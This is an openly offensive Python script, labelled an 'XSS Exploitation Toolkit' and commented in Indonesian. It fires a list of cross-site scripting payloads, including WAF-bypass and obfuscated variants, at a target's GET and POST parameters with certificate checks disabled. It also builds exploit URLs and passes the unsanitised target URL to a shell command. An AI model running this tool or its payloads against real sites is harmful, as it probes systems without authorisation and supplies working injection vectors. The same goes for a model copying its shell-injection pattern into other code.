#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, quote
import urllib3
import sys
import os
from colorama import Fore, Style

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Warna
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Payload XSS
PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    # Bypass WAF
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<svg/onload=prompt(1)>",
    # Obfuscated
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    # DOM-based
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "javascript:alert(1)",
]

def check_waf(target_url):
    """Cek apakah website menggunakan WAF (opsional, butuh wafw00f)"""
    print(f"{BLUE}[*] Memeriksa WAF...{RESET}")
    try:
        result = os.popen(f"wafw00f {target_url}").read()
        if "No WAF detected" in result:
            print(f"{GREEN}[+] Tidak terdeteksi WAF{RESET}")
        else:
            print(f"{RED}[!] WAF Terdeteksi: {result.split('is behind')[1].split('[')[0].strip()}{RESET}")
    except:
        print(f"{YELLOW}[!] Gagal memeriksa WAF (pastikan wafw00f terinstall){RESET}")

def scan_xss(target_url, param):
    """Scan parameter untuk XSS"""
    print(f"{BLUE}[*] Mengecek parameter: {param}{RESET}")
    vuln_params = []
    
    for payload in PAYLOADS:
        try:
            # Test GET Parameter
            test_url = target_url.replace(f"{param}=", f"{param}={quote(payload)}")
            res = requests.get(test_url, verify=False)
            
            if payload.lower() in res.text.lower():
                print(f"{GREEN}[+] XSS Ditemukan! Payload: {payload}{RESET}")
                vuln_params.append((param, payload, "GET"))
            
            # Test POST Data (jika diperlukan)
            data = {param: payload}
            res_post = requests.post(target_url, data=data, verify=False)
            if payload.lower() in res_post.text.lower():
                print(f"{GREEN}[+] XSS (POST) Ditemukan! Payload: {payload}{RESET}")
                vuln_params.append((param, payload, "POST"))
                
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
    
    return vuln_params

def exploit_xss(target_url, param, payload, method="GET"):
    """Exploit XSS"""
    print(f"{BLUE}[*] Mengeksploitasi XSS...{RESET}")
    if method == "GET":
        exploit_url = target_url.replace(f"{param}=", f"{param}={quote(payload)}")
        print(f"{GREEN}[+] Exploit URL: {exploit_url}{RESET}")
    else:
        print(f"{GREEN}[+] Exploit POST Data: {param}={payload}{RESET}")

def main():
    print(f"{YELLOW}\n=== XSS Exploitation Toolkit (XET) ==={RESET}\n")
    
    if len(sys.argv) < 2:
        print(f"{RED}[!] Usage: python3 {sys.argv[0]} <target_url> [parameter]{RESET}")
        print(f"{YELLOW}Example: python3 {sys.argv[0]} 'http://example.com/page?q=test' q{RESET}")
        sys.exit(1)
    
    target_url = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else None
    
    # Cek WAF (opsional)
    check_waf(target_url)
    
    # Jika parameter tidak diberikan, cari dari URL
    if not param:
        parsed = urlparse(target_url)
        query = parsed.query
        if not query:
            print(f"{RED}[!] Tidak ada parameter yang ditemukan{RESET}")
            sys.exit(1)
        params = [q.split("=")[0] for q in query.split("&")]
        print(f"{BLUE}[*] Parameter ditemukan: {', '.join(params)}{RESET}")
        for p in params:
            scan_xss(target_url, p)
    else:
        vuln_params = scan_xss(target_url, param)
        if vuln_params:
            for p, payload, method in vuln_params:
                exploit_xss(target_url, p, payload, method)
        else:
            print(f"{RED}[!] Tidak ditemukan XSS{RESET}")

if __name__ == "__main__":
    main()
